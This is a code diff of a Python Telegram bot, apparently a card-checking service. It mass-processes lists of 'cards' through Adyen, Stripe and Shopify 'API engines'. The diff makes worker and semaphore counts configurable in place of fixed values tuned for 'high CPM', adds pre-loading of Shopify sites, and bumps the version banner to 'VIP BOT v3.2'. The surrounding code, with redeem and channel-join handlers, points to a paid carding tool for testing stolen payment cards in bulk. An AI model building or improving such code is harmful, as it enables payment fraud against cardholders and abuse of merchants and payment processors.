-    sem = asyncio.Semaphore(25)  # OPTIMIZED: 25 concurrent API calls for high CPM
+    sem = asyncio.Semaphore(sem_count)
 
     async def dashboard_updater():
         while not is_stopped():
-            for _ in range(50):  # OPTIMIZED: 5 seconds instead of 2 (less Telegram API load)
+            for _ in range(50):
                 if is_stopped(): break
                 await asyncio.sleep(0.1)
             if is_stopped(): break
@@ -1546,8 +1920,8 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     last_resp = sf(f"Sys Err: {str(e)[:20]}")
                 queue.task_done()
 
-    # Launch workers (OPTIMIZED: 10 workers with 25 semaphore for max CPM)
-    wt = [asyncio.create_task(worker()) for _ in range(10)]
+    # Launch workers
+    wt = [asyncio.create_task(worker()) for _ in range(workers_count)]
     process_store[uid]["tasks"] = wt + [ut]
     await asyncio.gather(*wt, return_exceptions=True)
     if not ut.done():
@@ -1601,6 +1975,12 @@ async def post_init(app: Application):
         await init_db()
     except Exception as e:
         logger.error(f"DB Error: {e}")
+    # Pre-load Shopify sites if file exists
+    try:
+        sites = await load_shopify_sites()
+        logger.info(f"Post-init: Loaded {len(sites)} Shopify sites")
+    except Exception as e:
+        logger.error(f"Post-init: Failed to load Shopify sites: {e}")
 
 def main():
     bot_defaults = Defaults(parse_mode=ParseMode.HTML, link_preview_options=LinkPreviewOptions(is_disabled=True))
@@ -1614,7 +1994,7 @@ def main():
     app.add_handler(CallbackQueryHandler(prompt_redeem_cb, pattern=r"^prompt_redeem$"))
     app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
     app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
-    logger.info("\u2705 VIP BOT v3.0 IS FULLY OPERATIONAL WITH ADYEN & STRIPE API ENGINE!")
+    logger.info("\u2705 VIP BOT v3.2 IS FULLY OPERATIONAL WITH ADYEN, STRIPE & SHOPIFY API ENGINE!")
     while True:
         try:
             app.run_polling(drop_pending_updates=True)
